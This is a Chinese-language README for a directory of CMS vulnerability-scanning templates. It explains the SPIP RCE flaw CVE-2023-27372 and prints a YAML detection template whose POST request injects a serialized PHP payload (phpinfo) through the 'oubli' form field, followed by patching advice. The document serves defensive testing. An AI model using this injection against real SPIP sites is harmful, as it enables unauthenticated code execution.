# CMS 系统安全模板分类说明

本目录聚焦于主流内容管理系统（CMS）平台的安全风险，包括 WordPress、Joomla、Drupal、SPIP 等。模板涵盖远程代码执行、文件上传、SQL 注入、认证绕过等典型漏洞，帮助安全测试人员快速定位和验证相关风险。

---

## 分类说明

- **Joomla/Drupal**：全球最常用的 CMS，常见风险包括插件/模块漏洞、认证绕过、文件上传、SQL 注入等。
- **SPIP**：法国流行的开源 CMS，近年来多次曝出高危远程代码执行漏洞。
- **其他 CMS**：如 Magento、TYPO3、Concrete5 等，风险点多为第三方扩展和默认配置不当。

---

## 典型漏洞模板举例

### SPIP 远程代码执行漏洞（CVE-2023-27372）

**模板文件**：`CVE-2023-27372.yaml`

#### 漏洞简介

SPIP 4.2.1 之前版本由于对表单值的序列化处理不当，导致攻击者可在无需认证的情况下，通过特定表单字段注入恶意 PHP 代码，实现远程命令执行（RCE）。

#### 漏洞原理

该漏洞利用了 SPIP 在处理 `oubli` 字段时的反序列化缺陷。攻击者首先通过 GET 请求获取 CSRF token，然后在 POST 请求中将恶意 PHP 代码作为序列化字符串注入 `oubli` 字段。由于服务端未正确校验和过滤，最终导致代码被执行。

#### 检测逻辑（YAML内容解析）

```yaml
http:
  - raw:
      - |
        GET /spip.php?page=spip_pass HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /spip.php?page=spip_pass HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        page=spip_pass&formulaire_action=oubli&formulaire_action_args={{csrf}}&oubli=s:19:"<?php phpinfo(); ?>";
    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - "PHP Extension"
          - "PHP Version"
          - "<!DOCTYPE html"
        condition: and
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: csrf
        group: 1
        regex:
          - "name='formulaire_action_args'[^>]*value='([^']*)'"
        internal: true
        part: body_1
```

- 第一步 GET 请求获取 CSRF token。
- 第二步 POST 请求携带恶意序列化 payload，尝试执行 `phpinfo()`。
- 响应中若包含 PHP 相关信息且状态码为 200，则判定漏洞存在。

#### 防护建议

- 升级 SPIP 至官方修复版本（3.2.18、4.0.10、4.1.8、4.2.1 及以上）。
- 对所有用户输入进行严格校验，避免反序列化任意数据。
- 关闭不必要的调试和开发接口，最小化攻击面。

---

如需了解更多模板细节，请参考各 YAML 文件头部的 `description` 字段与官方安全公告。